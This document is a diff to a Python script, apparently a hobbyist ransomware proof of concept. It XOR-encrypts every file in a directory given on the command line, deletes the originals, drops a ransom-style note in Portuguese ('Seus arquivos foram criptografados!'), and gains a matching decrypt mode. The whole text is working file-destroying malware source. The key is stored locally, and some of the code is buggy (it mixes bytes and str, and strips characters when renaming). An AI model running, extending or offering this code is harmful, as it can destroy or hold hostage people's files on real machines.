@@ -8,6 +8,15 @@ def str_xor (s1, s2):
 
 	return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
 
+def key_generator(length):
+
+	key = (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(length)))
+
+	with open('key.txt', 'w') as w:
+			w.write(key)
+			w.close()
+	return key
+
 menu = r'''
 --------------------------------------------------------------------------------------------------
 Special Thanks to: ArielFreud 
@@ -36,18 +45,15 @@ MY GIT: https://github.com/Sargastico
 '''
 print(menu+ '\n')
 
-diretorio = str.encode() # Insert the directory path here --> 'C:\\User\\test\\test_r'
-
-key = (''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(20000)))
-
-with open('key.txt', 'w') as w:
-	w.write(key)
-	w.close()
+#diretorio = str.encode('C:\\Users\\ferna\\Desktop\\test\\') 
+diretorio = str.encode(sys.argv[3])
 
 if sys.argv[1] == '-e':
 
+	key = key_generator(int(sys.argv[2]))
+
 	arq = open('Leia-me.txt', 'w') 
-	arq.write('OOOOPPSSSS! Files encrypted! =D \n')
+	arq.write('OOOOPPSSSS! Seus arquivos foram criptografados! =D \n')
 	arq.close()
 
 	for files in os.listdir(diretorio):
@@ -63,6 +69,28 @@ if sys.argv[1] == '-e':
 			n.write(enc)
 			n.close()
 			os.remove(files)
-			print(os.path.basename(files)+" <<<<>>>> Encrypted! ")
+			print(os.path.basename(files)+" <<<<>>>> Criptografado! ")
 
+elif sys.argv[1] == '-d':
 
+	with open('key.txt','r') as r:
+		key = r.read()
+		r.close()
+
+	for files in os.listdir(diretorio):
+		os.chdir(diretorio)
+
+		with open(files, 'rb') as r:
+			data = r.read()
+			r.close()
+			dec = str_xor(data, key.strip('\n'))
+			new_file = files.strip('(encrypted)')
+
+		with open(new_file, 'wb') as n:
+			n.write(dec)
+			n.close()
+			os.remove(files)
+			print(os.path.basename(new_file)+" <<<<>>>> Descriptografado! ")
+
+else:
+ 	print("Use valid arguments -e/-d [encrypt/decrypt]")
